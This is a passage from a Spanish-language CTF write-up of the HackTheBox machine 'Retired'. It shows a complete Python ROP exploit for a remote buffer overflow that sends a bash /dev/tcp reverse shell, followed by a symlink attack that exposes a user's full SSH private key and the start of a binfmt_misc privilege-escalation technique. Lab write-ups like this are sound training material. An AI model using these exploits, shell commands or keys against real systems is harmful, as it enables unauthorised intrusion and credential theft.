<p class="plain-text">Para terminar el payload en el registro <code class="language-plaintext highlighter-rouge">rdi</code> guardaremos la direccion de la seccion <code class="language-plaintext highlighter-rouge">.data</code> que contiene nuestro comando de bash, seguido de la funcion <code class="language-plaintext highlighter-rouge">system</code> que al leer el primer argumento de <code class="language-plaintext highlighter-rouge">rdi</code> ejecutara el oneliner y enviara la <code class="language-plaintext highlighter-rouge">revshell</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">payload </span><span class="o">+= </span><span class="p">p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x026796</span><span class="p">)</span><span class="c1"> # pop rdi; ret;  </span><span class="p">
payload </span><span class="o">+=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x1be1a0</span><span class="p">)</span><span class="c1"> # .data</span><span class="p">
payload </span><span class="o">+=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x048e50</span><span class="p">)</span><span class="c1"> # system()</span><span class="p"></span>
</code></pre></div></div><br>

<p class="plain-text">Finalmente enviamos la petición con el <code class="language-plaintext highlighter-rouge">payload</code> que hemos definido como licensefile</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">requests.post(</span><span class="s">"http://10.10.11.154/activate_license.php"</span><span class="p">, files</span><span class="o">=</span><span class="p">{</span><span class="s">"licensefile"</span><span class="p">: payload})  </span>
</code></pre></div></div><br>

<p class="plain-text">Este script al ejecutarlo deberia explotar el <code class="language-plaintext highlighter-rouge">bof</code> remotamente y enviarnos la shell</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">p64
</span><span class="o">import </span><span class="p">requests

offset </span><span class="o">= </span><span class="mi">520</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset

libc_base </span><span class="o">= </span><span class="mi">0x7f670e288000</span><span class="p">

command </span><span class="o">= </span><span class="no">b</span><span class="s">"bash -c 'bash -i >& /dev/tcp/10.10.14.10/443 0>&1'"</span><span class="p">

payload </span><span class="o">=  </span><span class="no">b</span><span class="s">""</span><span class="p">
payload </span><span class="o">+= </span><span class="p">junk

</span><span class="o">for</span><span class="p"> i</span><span class="o"> in</span><span class="no"> range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="no"> len</span><span class="p">(command), </span><span class="mi">8</span><span class="p">):
    payload</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x26796</span><span class="p">)</span><span class="c1">         # pop rdi; ret;</span><span class="p">
    payload</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x1be1a0</span><span class="o"> +</span><span class="p"> i)</span><span class="c1">    # .data</span><span class="p">
    payload</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x2890f</span><span class="p">)</span><span class="c1">         # pop rsi; ret;</span><span class="p">
    payload</span><span class="o"> +=</span><span class="p"> command[i:i</span><span class="o">+</span><span class="mi">8</span><span class="p">].ljust(</span><span class="mi">8</span><span class="p">,</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x00</span><span class="s">"</span><span class="p">)</span><span class="c1"> # string</span><span class="p">
    payload</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x603b2</span><span class="p">)</span><span class="c1">         # mov qword ptr [rdi], rsi; ret;</span><span class="p">

payload </span><span class="o">+= </span><span class="p">p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x026796</span><span class="p">)</span><span class="c1"> # pop rdi; ret;</span><span class="p">
payload </span><span class="o">+=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x1be1a0</span><span class="p">)</span><span class="c1"> # .data</span><span class="p">
payload </span><span class="o">+=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x048e50</span><span class="p">)</span><span class="c1"> # system()</span><span class="p">

requests.post(</span><span class="s">"http://10.10.11.154/activate_license.php"</span><span class="p">, files</span><span class="o">=</span><span class="p">{</span><span class="s">"licensefile"</span><span class="p">: payload})  </span>
</code></pre></div></div><br>

<p class="plain-text">Al ejecutar el <code class="language-plaintext highlighter-rouge">script</code> enviara la petición con nuestro payload y al programa interpretarla nos enviara una <code class="language-plaintext highlighter-rouge">revshell</code> en este caso como <code class="language-plaintext highlighter-rouge">www-data</code> a nuestro host</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">exploit.py</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ sudo netcat </span><span class="p">-lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.154 
</span><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)  
</span><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ hostname -I
10.10.11.154 
</span><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

</section>

<section class="post" id="shell-dev">
<br><h3 class="post-title">Shell - dev</h3><br>

<p class="plain-text">Si miramos los archivos que hay encontramos 4 archivos <code class="language-plaintext highlighter-rouge">zip</code> de backups, la <code class="language-plaintext highlighter-rouge">licencia</code> generada por la explotación anterior y el directorio <code class="language-plaintext highlighter-rouge">html</code> de la web</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ ls -l
-rw-r--r-- 1 dev      www-data 505153 Jun 23 17:46 </span><span class="ro">2023-06-23_17-46-07-html.zip</span><span class="p">  
-rw-r--r-- 1 dev      www-data 505153 Jun 23 17:47 </span><span class="ro">2023-06-23_17-47-01-html.zip</span><span class="p">  
-rw-r--r-- 1 dev      www-data 505153 Jun 23 17:48 </span><span class="ro">2023-06-23_17-48-07-html.zip</span><span class="p">  
-rw-r--r-- 1 dev      www-data 505153 Jun 23 17:49 </span><span class="ro">2023-06-23_17-49-01-html.zip</span><span class="p">  
drwxrwsrwx 5 www-data www-data   4096 Mar 11  2022 </span><span class="az">html</span><span class="p">
-rw-r--r-- 1 www-data www-data  12288 Jun 23 17:48 license.sqlite
</span><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Como parece que los <code class="language-plaintext highlighter-rouge">zip</code> son creados por una <code class="language-plaintext highlighter-rouge">tarea</code> podemos listar las proximas tareas, faltan <code class="language-plaintext highlighter-rouge">33</code> segundos para que el servicio <code class="language-plaintext highlighter-rouge">website_backup.service</code> se ejecute</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ systemctl list-timers 
NEXT                        LEFT          LAST                        PASSED               UNIT                         ACTIVATES
Fri 2023-06-23 17:50:00 UTC 33s left      Fri 2023-06-23 17:49:01 UTC 25s ago              website_backup.timer         website_backup.service
Fri 2023-06-23 17:55:52 UTC 6min left     n/a                         n/a                  systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service  
Fri 2023-06-23 17:58:44 UTC 9min left     Fri 2022-03-11 11:13:00 UTC 1 years 3 months ago apt-daily-upgrade.timer      apt-daily-upgrade.service
Fri 2023-06-23 18:04:41 UTC 15min left    Mon 2022-03-28 11:12:56 UTC 1 years 2 months ago fstrim.timer                 fstrim.service
Fri 2023-06-23 18:09:00 UTC 19min left    Fri 2023-06-23 17:40:57 UTC 8min ago             phpsessionclean.timer        phpsessionclean.service
Fri 2023-06-23 23:45:31 UTC 5h 56min left Fri 2022-03-11 15:32:28 UTC 1 years 3 months ago apt-daily.timer              apt-daily.service
Sat 2023-06-24 00:00:00 UTC 6h left       Fri 2023-06-23 17:40:57 UTC 8min ago             logrotate.timer              logrotate.service
Sat 2023-06-24 00:00:00 UTC 6h left       Fri 2023-06-23 17:40:57 UTC 8min ago             man-db.timer                 man-db.service
Sun 2023-06-25 03:10:46 UTC 1 day 9h left Fri 2023-06-23 17:41:27 UTC 7min ago             e2scrub_all.timer            e2scrub_all.service
</span><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Al mirar la config del <code class="language-plaintext highlighter-rouge">servicio</code> encontramos que ejecuta el binario <code class="language-plaintext highlighter-rouge">/usr/bin/webbackup</code> usando el usuario <code class="language-plaintext highlighter-rouge">dev</code> y el grupo <code class="language-plaintext highlighter-rouge">www-data</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ find / -name website_backup.service 2>/dev/null  
/etc/systemd/system/website_backup.service
</span><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ cat /etc/systemd/system/website_backup.service
[Unit]
Description=Backup and rotate website

[Service]
User=dev
Group=www-data
ExecStart=/usr/bin/webbackup

[Install]
WantedBy=multi-user.target
</span><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Resumiendo la funcion de <code class="language-plaintext highlighter-rouge">webbackup</code> vemos que en el directorio <code class="language-plaintext highlighter-rouge">/var/www</code> crea un backup de todo el directorio <code class="language-plaintext highlighter-rouge">/var/www/html</code> usando como nombre la <code class="language-plaintext highlighter-rouge">fecha</code> y hora</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ cat /usr/bin/webbackup
#!/bin/bash
set -euf -o pipefail

cd /var/www/

SRC=/var/www/html
DST="/var/www/$(date +%Y-%m-%d_%H-%M-%S)-html.zip"

/usr/bin/rm --force -- "$DST"
/usr/bin/zip --recurse-paths "$DST" "$SRC"

KEEP=10
/usr/bin/find /var/www/ -maxdepth 1 -name '*.zip' -print0 \  
    | sort --zero-terminated --numeric-sort --reverse \
    | while IFS= read -r -d '' backup; do
        if [ "$KEEP" -le 0 ]; then
            /usr/bin/rm --force -- "$backup"
        fi
        KEEP="$((KEEP-1))"
    done
</span><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Podemos aprovechar que la <code class="language-plaintext highlighter-rouge">tarea</code> se ejecuta como el usuario <code class="language-plaintext highlighter-rouge">dev</code> para crear un enlace simbolico de su clave ssh <code class="language-plaintext highlighter-rouge">privada</code> dentro del directorio <code class="language-plaintext highlighter-rouge">html</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">~/html</span><span class="p">$ ln -s /home/dev/.ssh/id_rsa id_rsa  
</span><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">~/html</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Esperamos que se ejecute la tarea y cuando cree un nuevo <code class="language-plaintext highlighter-rouge">zip</code> lo copiamos un directorio como <code class="language-plaintext highlighter-rouge">/tmp</code> ya que despues de un rato este se borra</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ ls -l
-rw-r--r-- 1 dev      www-data 505153 Jun 23 17:49 </span><span class="ro">2023-06-23_17-49-01-html.zip</span><span class="p">  
-rw-r--r-- 1 dev      www-data 505153 Jun 23 17:50 </span><span class="ro">2023-06-23_17-50-01-html.zip</span><span class="p">  
-rw-r--r-- 1 dev      www-data 505153 Jun 23 17:51 </span><span class="ro">2023-06-23_17-51-07-html.zip</span><span class="p">  
-rw-r--r-- 1 dev      www-data 507284 Jun 23 17:52 </span><span class="ro">2023-06-23_17-52-01-html.zip</span><span class="p">  
drwxrwsrwx 5 www-data www-data   4096 Jun 23 17:51 </span><span class="az">html</span><span class="p">
-rw-r--r-- 1 www-data www-data  12288 Jun 23 17:48 license.sqlite
</span><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ cp 2023-06-23_17-52-01-html.zip /tmp
</span><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora lo descomprimimos y en el podemos ver existente el archivo <code class="language-plaintext highlighter-rouge">id_rsa</code> de antes</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">/tmp</span><span class="p">$ unzip 2023-06-23_17-52-01-html.zip  
Archive:  2023-06-23_17-52-01-html.zip
   creating: var/www/html/
   creating: var/www/html/js/
  inflating: var/www/html/js/scripts.js  
  inflating: var/www/html/activate_license.php  
   creating: var/www/html/assets/
  inflating: var/www/html/assets/favicon.ico  
   creating: var/www/html/assets/img/
  inflating: var/www/html/assets/img/close-icon.svg  
  inflating: var/www/html/assets/img/navbar-logo.svg  
   creating: var/www/html/assets/img/about/
  inflating: var/www/html/assets/img/about/2.jpg  
  inflating: var/www/html/assets/img/about/4.jpg  
  inflating: var/www/html/assets/img/about/3.jpg  
  inflating: var/www/html/assets/img/about/1.jpg  
   creating: var/www/html/assets/img/logos/
  inflating: var/www/html/assets/img/logos/facebook.svg  
  inflating: var/www/html/assets/img/logos/microsoft.svg  
  inflating: var/www/html/assets/img/logos/google.svg  
  inflating: var/www/html/assets/img/logos/ibm.svg  
   creating: var/www/html/assets/img/team/
  inflating: var/www/html/assets/img/team/2.jpg  
  inflating: var/www/html/assets/img/team/3.jpg  
  inflating: var/www/html/assets/img/team/1.jpg  
  inflating: var/www/html/assets/img/header-bg.jpg  
  inflating: var/www/html/beta.html  
  inflating: var/www/html/default.html  
  inflating: var/www/html/index.php  
  inflating: var/www/html/id_rsa     
   creating: var/www/html/css/
  inflating: var/www/html/css/styles.css  
</span><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">/tmp</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Al leer el archivo <code class="language-plaintext highlighter-rouge">id_rsa</code> encontramos la clave privada del usuario <code class="language-plaintext highlighter-rouge">dev</code> ya que al comprimir el directorio <code class="language-plaintext highlighter-rouge">html</code> tomaba el enlace simbolico para leerla</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">/tmp/var/www/html</span><span class="p">$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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  
7rTyG3wbNka1sAAAALZGV2QHJldGlyZWQ=
-----END OPENSSH PRIVATE KEY-----
</span><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">/tmp/var/www/html</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Podemos simplemente usar la <code class="language-plaintext highlighter-rouge">id_rsa</code> para conectarnos por <code class="language-plaintext highlighter-rouge">ssh</code> a la maquina sin contraseña, al hacerlo nos convertimos en <code class="language-plaintext highlighter-rouge">dev</code> y podemos leer la primera <code class="language-plaintext highlighter-rouge">flag</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ ssh </span><span class="p">dev@10.10.11.154 -i id_rsa
</span><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ id
uid=1001(dev) gid=1001(dev) groups=1001(dev),33(www-data)  
</span><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ hostname -I
10.10.11.154
</span><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ cat user.txt 
f3c**************************924
</span><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

</section>

<section class="post" id="shell-root">
<br><h3 class="post-title">Shell - root</h3><br>

<p class="plain-text">Mirando los archivos existentes encontramos los directorios <code class="language-plaintext highlighter-rouge">activate_license</code> y <code class="language-plaintext highlighter-rouge">emuemu</code>, actualmente activate_license lo hemos explotado asi que lo omitiremos</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ ls
</span><span class="az">activate_license  emuemu  </span><span class="p">user.txt  
</span><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">En el directorio <code class="language-plaintext highlighter-rouge">emuemu</code> encontramos varios archivos, entre ellos algunos en <code class="language-plaintext highlighter-rouge">C</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">dev@retired:</span><span class="az">~/emuemu</span><span class="p">$ ls
Makefile  README.md  emuemu  emuemu.c  reg_helper  reg_helper.c  test  
</span><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~/emuemu</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Si miramos lo que hace <code class="language-plaintext highlighter-rouge">emuemu</code> con el codigo de <code class="language-plaintext highlighter-rouge">emuemu.c</code> no hace nada realmente interesante, solo usa <code class="language-plaintext highlighter-rouge">puts</code> para mostrar un mensaje y sale con un codigo <code class="language-plaintext highlighter-rouge">1</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~/emuemu</span><span class="p">$ cat emuemu.c 
#include &ltstdio.h>

/* currently this is only a dummy implementation doing nothing */  

int main(void) {
    puts("EMUEMU is still under development.");
    return 1;
}
</span><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~/emuemu</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text"><code class="language-plaintext highlighter-rouge">reg_helper</code> toma un input y escribe en el archivo <code class="language-plaintext highlighter-rouge">register</code> de binfmt_misc</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~/emuemu</span><span class="p">$ cat reg_helper.c 
#define _GNU_SOURCE

#include &ltfcntl.h>
#include &ltstdio.h>
#include &ltstring.h>
#include &ltsys/stat.h>
#include &ltsys/types.h>
#include &ltunistd.h>

int main(void) {
    char cmd[512] = { 0 };

    read(STDIN_FILENO, cmd, sizeof(cmd)); cmd[-1] = 0;

    int fd = open("/proc/sys/fs/binfmt_misc/register", O_WRONLY);  
    if (-1 == fd)
        perror("open");
    if (write(fd, cmd, strnlen(cmd,sizeof(cmd))) == -1)
        perror("write");
    if (close(fd) == -1)
        perror("close");

    return 0;
}
</span><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~/emuemu</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Lo interesante esta en el archivo <code class="language-plaintext highlighter-rouge">Makefile</code>, analizemoslo poco a poco, primero setea una capability <code class="language-plaintext highlighter-rouge">cap_dac_override=ep</code> al binario <code class="language-plaintext highlighter-rouge">reg_helper</code> de emuemu</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~/emuemu</span><span class="p">$ cat Makefile 
CC := gcc
CFLAGS := -std=c99 -Wall -Werror -Wextra -Wpedantic -Wconversion -Wsign-conversion  

SOURCES := $(wildcard *.c)
TARGETS := $(SOURCES:.c=)

.PHONY: install clean

install: $(TARGETS)
	@echo "[+] Installing program files"
	install --mode 0755 emuemu /usr/bin/
	mkdir --parent --mode 0755 /usr/lib/emuemu /usr/lib/binfmt.d
	install --mode 0750 --group dev reg_helper /usr/lib/emuemu/
	setcap cap_dac_override=ep /usr/lib/emuemu/reg_helper

	@echo "[+] Register OSTRICH ROMs for execution with EMUEMU"
	echo ':EMUEMU:M::\x13\x37OSTRICH\x00ROM\x00::/usr/bin/emuemu:' \
		| tee /usr/lib/binfmt.d/emuemu.conf \
		| /usr/lib/emuemu/reg_helper

clean:
	rm -f -- $(TARGETS)
</span><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~/emuemu</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Esto podemos comprobarlo usando <code class="language-plaintext highlighter-rouge">getcap</code> sobre el binario <code class="language-plaintext highlighter-rouge">reg_helper</code> indicado</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ /sbin/getcap /usr/lib/emuemu/reg_helper  
/usr/lib/emuemu/reg_helper cap_dac_override=ep
</span><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Ademas de ello hace un <code class="language-plaintext highlighter-rouge">echo</code> de una cadena la cual esta separada por <code class="language-plaintext highlighter-rouge">:</code> y hace un <code class="language-plaintext highlighter-rouge">tee</code> sobre <code class="language-plaintext highlighter-rouge">emuemu.conf</code> para escribir el output del echo en este archivo</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ cat /usr/lib/binfmt.d/emuemu.conf
:EMUEMU:M::\x13\x37OSTRICH\x00ROM\x00::/usr/bin/emuemu:  
</span><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Leyendo un poco de documentacion encontramos lo que significa cada serparacion</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">:name:type:offset:magic:mask:interpreter:flags  </span>
</code></pre></div></div><br>

<p class="plain-text">El <code class="language-plaintext highlighter-rouge">Makefile</code> tambien toma el output del echo para pasarselo como input a <code class="language-plaintext highlighter-rouge">reg_helper</code> el cual crea un archivo de configuración con el nombre, en el podemos ver los valores de las separaciones como el <code class="language-plaintext highlighter-rouge">interprete</code> y los <code class="language-plaintext highlighter-rouge">magicbytes</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ cat /proc/sys/fs/binfmt_misc/EMUEMU  
enabled
interpreter /usr/bin/emuemu
flags: 
offset 0
magic 13374f53545249434800524f4d00
</span><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Cuando ejecutemos un binario correspondiente a los <code class="language-plaintext highlighter-rouge">magicbyte</code> especificados este usara el <code class="language-plaintext highlighter-rouge">interprete</code> que en este caso es el binario <code class="language-plaintext highlighter-rouge">emuemu</code> para ejecutarlo</p>

<p class="plain-text">Mirando las <code class="language-plaintext highlighter-rouge">flags</code> en la documentacion podemos ver la flag <code class="language-plaintext highlighter-rouge">C</code> que sirve para tomar las <code class="language-plaintext highlighter-rouge">credenciales</code> del binario al que pertenecen los <code class="language-plaintext highlighter-rouge">magicbytes</code> y no del inteprete</p>
<a href="/hackthebox/retired/8.png" target="_blank"><div><p><img src="/hackthebox/retired/8.png"></p></div></a>

<p class="plain-text">Lo que podemos hacer es tomar los <code class="language-plaintext highlighter-rouge">magicbytes</code> de un binario <code class="language-plaintext highlighter-rouge">suid</code> y obligar que el <code class="language-plaintext highlighter-rouge">interprete</code> sea un binario personalizado que nos otorge una <code class="language-plaintext highlighter-rouge">shell</code>, para ello primero necesitamos un binario suid cualquiera, podemos usar simplemente <code class="language-plaintext highlighter-rouge">mount</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ find / -perm -u+s 2>/dev/null  
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/mount
/usr/bin/umount
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
</span><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora usando <code class="language-plaintext highlighter-rouge">xxd</code> para convertirlo a hexadecimal y utilizando <code class="language-plaintext highlighter-rouge">expresiones</code> <code class="language-plaintext highlighter-rouge">regulares</code> podemos obtener los <code class="language-plaintext highlighter-rouge">magicbytes</code> pertenecientes al binario <code class="language-plaintext highlighter-rouge">mount</code></p>
